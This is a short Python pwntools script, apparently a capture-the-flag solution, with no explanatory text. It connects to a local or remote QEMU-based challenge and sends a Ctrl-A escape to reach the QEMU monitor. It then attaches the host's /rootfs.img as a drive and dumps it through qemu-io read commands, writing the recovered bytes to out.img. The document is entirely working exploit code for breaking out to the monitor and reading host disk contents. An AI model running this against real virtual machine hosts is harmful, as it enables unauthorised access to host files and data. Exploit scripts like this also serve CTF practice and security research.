from pwn import *
from tqdm import trange
import fuckpy3
context(os='linux', arch='amd64', log_level='error')
DEBUG = 1
if DEBUG:
 	p = process(argv='./start.sh', raw=False)
else:
 	p = remote('82.157.40.132', 35600)
def main():
	 ctrl_a = '\x01c'
	 p.send(ctrl_a)
	 s = b''
	 p.sendlineafter('(qemu)', 'stop')
	 # p.sendlineafter('(qemu)', 'xp/100000bc 0x000000')
	 p.sendlineafter('(qemu)', 'drive_add 0 file=/rootfs.img,id=flag,format=raw,if=none,readonly=on')
	 for i in trange(160):
		 p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x4000"')
		 p.recvuntil('\r\n')
		 data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
		 for d in data:
		 	s += b''.join(d.split()[1:17]).unhex()
	 i = 160
	 p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x600"')
	 p.recvuntil('\r\n')
	 data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
	 for d in data:
	 	s += b''.join(d.split()[1:17]).unhex()
	 # print(s)
	 with open('out.img','wb') as f:
	 	f.write(s)
	 # print(data)
	 p.interactive()

if __name__ == '__main__':
 	main()
